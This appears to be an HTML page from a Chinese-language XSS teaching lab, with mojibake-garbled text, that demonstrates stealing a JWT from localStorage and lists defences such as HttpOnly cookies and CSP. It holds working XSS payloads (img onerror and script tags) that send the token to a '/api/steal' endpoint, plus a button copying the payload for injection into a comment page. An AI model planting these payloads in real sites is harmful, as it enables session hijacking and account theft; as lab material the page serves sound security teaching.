<!DOCTYPE html>
<html lang="zh-CN">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>å®éªŒä¸‰ï¼šXSS çªƒå–å‡­è¯</title>
  <link rel="stylesheet" href="style.css">
</head>
<body>
  <div class="container">
    <nav class="nav">
      <a href="index.html">â† è¿”å›é¦–é¡µ</a>
    </nav>

    <header>
      <h1>ğŸ”‘ å®éªŒä¸‰ï¼šXSS çªƒå–å‡­è¯</h1>
      <p class="subtitle">Token Stealing via XSS</p>
    </header>

    <section>
      <h2>ğŸ“– åŸç†è¯´æ˜</h2>
      <p>è¿™æ˜¯ XSS æœ€å±é™©çš„åˆ©ç”¨æ–¹å¼ä¹‹ä¸€ï¼š</p>
      <ol style="margin: 1rem 0 0 1.5rem;">
        <li>ç”¨æˆ·ç™»å½•åï¼ŒToken å­˜å‚¨åœ¨ localStorage</li>
        <li>æ”»å‡»è€…é€šè¿‡ XSS æ³¨å…¥æ¶æ„è„šæœ¬</li>
        <li>è„šæœ¬è¯»å– localStorage ä¸­çš„ Token</li>
        <li>å°† Token å‘é€åˆ°æ”»å‡»è€…æœåŠ¡å™¨</li>
        <li><strong>æ”»å‡»è€…è·å¾—ç”¨æˆ·èº«ä»½ï¼</strong></li>
      </ol>
      <div class="warning-box" style="margin-top: 1rem;">
        <strong>âš ï¸ æ ¸å¿ƒé—®é¢˜</strong>
        <p>localStorage å¯¹ JavaScript å®Œå…¨å¯è§ï¼ŒXSS + JWT = ç¾éš¾ï¼</p>
      </div>
    </section>

    <section>
      <h2>ğŸ‘¤ æ¨¡æ‹Ÿç”¨æˆ·ç™»å½•</h2>
      <p>ç‚¹å‡»æŒ‰é’®æ¨¡æ‹Ÿç”¨æˆ·ç™»å½•ï¼ŒToken ä¼šå­˜å‚¨åˆ° localStorageï¼š</p>
      
      <div style="margin: 1rem 0;">
        <button class="btn" onclick="simulateLogin()">æ¨¡æ‹Ÿç™»å½•ï¼ˆç”Ÿæˆ Tokenï¼‰</button>
        <button class="btn btn-secondary" onclick="logout()">é€€å‡ºç™»å½•</button>
      </div>

      <div class="token-display" id="tokenDisplay">
        <strong>å½“å‰ Tokenï¼š</strong>
        <p id="currentToken" style="margin-top: 0.5rem; color: #fcc419;">æœªç™»å½•</p>
      </div>
    </section>

    <section>
      <h2>âš”ï¸ æ”»å‡»æ¼”ç¤º</h2>
      
      <p>æ”»å‡»è€…ä¼šåœ¨è¯„è®ºä¸­æ³¨å…¥ä»¥ä¸‹ä»£ç ï¼š</p>
      <pre><code>&lt;img src=x onerror="
  fetch('/api/steal?token=' + localStorage.getItem('token'))
"&gt;</code></pre>

      <p style="margin-top: 1rem;">æˆ–è€…æ›´éšè”½çš„æ–¹å¼ï¼š</p>
      <pre><code>&lt;script&gt;
  new Image().src = '/api/steal?token=' + localStorage.getItem('token')
&lt;/script&gt;</code></pre>

      <div style="margin: 1.5rem 0;">
        <button class="btn" onclick="simulateAttack()" style="background: #ff6b6b;">
          ğŸš¨ æ¨¡æ‹Ÿæ”»å‡»ï¼ˆçªƒå–å½“å‰ Tokenï¼‰
        </button>
      </div>

      <div class="info-box">
        <strong>ğŸ’¡ å»è¯„è®ºé¡µæ³¨å…¥æ”»å‡»ä»£ç ï¼š</strong>
        <p style="margin-top: 0.5rem;">
          å¤åˆ¶ä»¥ä¸‹ä»£ç åˆ° <a href="comment.html" style="color: #e94560;">è¯„è®ºç³»ç»Ÿ</a> å‘è¡¨ï¼š
        </p>
        <pre style="margin-top: 0.5rem;"><code>&lt;img src=x onerror="fetch('/api/steal?token='+localStorage.getItem('token'))"&gt;</code></pre>
        <button class="btn btn-secondary" onclick="copyPayload()" style="margin-top: 0.5rem;">å¤åˆ¶ Payload</button>
      </div>
    </section>

    <section>
      <h2>ğŸ“‹ æ”»å‡»è€…æœåŠ¡å™¨æ—¥å¿—</h2>
      <p>ä»¥ä¸‹æ˜¯"æ”»å‡»è€…æœåŠ¡å™¨"æ”¶åˆ°çš„è¢«çªƒå– Tokenï¼š</p>
      
      <div style="margin: 1rem 0;">
        <button class="btn btn-secondary" onclick="loadStolenTokens()">åˆ·æ–°æ—¥å¿—</button>
        <button class="btn btn-secondary" onclick="clearStolenTokens()">æ¸…ç©ºæ—¥å¿—</button>
      </div>

      <div class="attack-log" id="stolenLog">
        <p style="color: #888;">åŠ è½½ä¸­...</p>
      </div>
    </section>

    <section>
      <h2>ğŸ›¡ï¸ é˜²å¾¡æ–¹æ¡ˆ</h2>
      
      <h3 style="margin: 1rem 0 0.5rem; color: #4dabf7;">1. HttpOnly Cookie</h3>
      <p>å°† Token å­˜å‚¨åœ¨ HttpOnly Cookie ä¸­ï¼ŒJavaScript æ— æ³•è¯»å–ï¼š</p>
      <pre><code>// æœåŠ¡ç«¯è®¾ç½®
res.cookie('token', jwt, {
  httpOnly: true,  // JS æ— æ³•è¯»å–
  secure: true,    // ä»… HTTPS
  sameSite: 'strict'
})</code></pre>

      <h3 style="margin: 1rem 0 0.5rem; color: #4dabf7;">2. CSP ç­–ç•¥</h3>
      <p>é™åˆ¶è„šæœ¬æ¥æºå’Œå¤–éƒ¨è¯·æ±‚ï¼š</p>
      <pre><code>Content-Security-Policy: 
  script-src 'self';
  connect-src 'self';</code></pre>

      <h3 style="margin: 1rem 0 0.5rem; color: #4dabf7;">3. Token ç»‘å®š</h3>
      <p>å°† Token ä¸ç”¨æˆ· IPã€User-Agent ç»‘å®šï¼Œå¼‚å¸¸æ—¶å¤±æ•ˆ</p>

      <h3 style="margin: 1rem 0 0.5rem; color: #4dabf7;">4. çŸ­æœŸ Token + Refresh Token</h3>
      <p>Access Token æœ‰æ•ˆæœŸçŸ­ï¼ˆå¦‚ 15 åˆ†é’Ÿï¼‰ï¼Œé™ä½æ³„éœ²é£é™©</p>
    </section>

    <section>
      <h2>ğŸ’¡ å®‰å…¨å»ºè®®</h2>
      <div class="success-box">
        <ul style="margin-left: 1.5rem;">
          <li><strong>æ•æ„Ÿæ•°æ®ä¸è¦å­˜ localStorage</strong></li>
          <li>ä½¿ç”¨ HttpOnly Cookie å­˜å‚¨è®¤è¯ä¿¡æ¯</li>
          <li>å®æ–½ä¸¥æ ¼çš„ CSP ç­–ç•¥</li>
          <li>å¯¹æ‰€æœ‰ç”¨æˆ·è¾“å…¥è¿›è¡Œè½¬ä¹‰</li>
          <li>å®šæœŸå®¡è®¡ä»£ç ä¸­çš„ XSS æ¼æ´</li>
        </ul>
      </div>
    </section>
  </div>

  <script>
    // é¡µé¢åŠ è½½æ—¶æ£€æŸ¥ Token å’ŒåŠ è½½æ—¥å¿—
    updateTokenDisplay()
    loadStolenTokens()

    function simulateLogin() {
      // ç”Ÿæˆæ¨¡æ‹Ÿ JWT Token
      const header = btoa(JSON.stringify({ alg: 'HS256', typ: 'JWT' }))
      const payload = btoa(JSON.stringify({
        userId: 1001,
        username: 'victim_user',
        role: 'admin',
        exp: Date.now() + 3600000
      }))
      const signature = btoa('fake_signature_' + Math.random().toString(36).slice(2))
      const token = `${header}.${payload}.${signature}`
      
      localStorage.setItem('token', token)
      updateTokenDisplay()
      alert('ç™»å½•æˆåŠŸï¼Token å·²å­˜å‚¨åˆ° localStorage')
    }

    function logout() {
      localStorage.removeItem('token')
      updateTokenDisplay()
      alert('å·²é€€å‡ºç™»å½•')
    }

    function updateTokenDisplay() {
      const token = localStorage.getItem('token')
      const el = document.getElementById('currentToken')
      if (token) {
        el.textContent = token
        el.style.color = '#51cf66'
      } else {
        el.textContent = 'æœªç™»å½•'
        el.style.color = '#888'
      }
    }

    function simulateAttack() {
      const token = localStorage.getItem('token')
      if (!token) {
        alert('è¯·å…ˆç™»å½•ï¼')
        return
      }
      
      // æ¨¡æ‹Ÿ XSS æ”»å‡»çªƒå– Token
      fetch('/api/steal?token=' + encodeURIComponent(token))
        .then(() => {
          alert('ğŸš¨ Token å·²è¢«çªƒå–ï¼æŸ¥çœ‹ä¸‹æ–¹æ”»å‡»è€…æ—¥å¿—')
          loadStolenTokens()
        })
    }

    async function loadStolenTokens() {
      const logEl = document.getElementById('stolenLog')
      
      try {
        const res = await fetch('/api/steal/list')
        const data = await res.json()
        
        if (data.tokens.length === 0) {
          logEl.innerHTML = '<p style="color: #888;">æš‚æ— è®°å½•</p>'
          return
        }
        
        logEl.innerHTML = data.tokens.map((t, i) => `
          <div class="log-item">
            <strong style="color: #ff6b6b;">#${i + 1} Token è¢«çªƒå–</strong>
            <p style="margin-top: 0.3rem; word-break: break-all;">
              <code>${escapeHtml(t.token)}</code>
            </p>
            <p style="color: #888; font-size: 0.85rem; margin-top: 0.3rem;">
              æ—¶é—´: ${t.time} | IP: ${t.ip}
            </p>
          </div>
        `).reverse().join('')
        
      } catch (err) {
        logEl.innerHTML = '<p style="color: #ff6b6b;">åŠ è½½å¤±è´¥</p>'
      }
    }

    async function clearStolenTokens() {
      await fetch('/api/steal/clear', { method: 'DELETE' })
      loadStolenTokens()
    }

    function copyPayload() {
      const payload = `<img src=x onerror="fetch('/api/steal?token='+localStorage.getItem('token'))">`
      navigator.clipboard.writeText(payload)
      alert('Payload å·²å¤åˆ¶ï¼å»è¯„è®ºé¡µç²˜è´´å‘è¡¨')
    }

    function escapeHtml(str) {
      const div = document.createElement('div')
      div.textContent = str
      return div.innerHTML
    }
  </script>
</body>
</html>
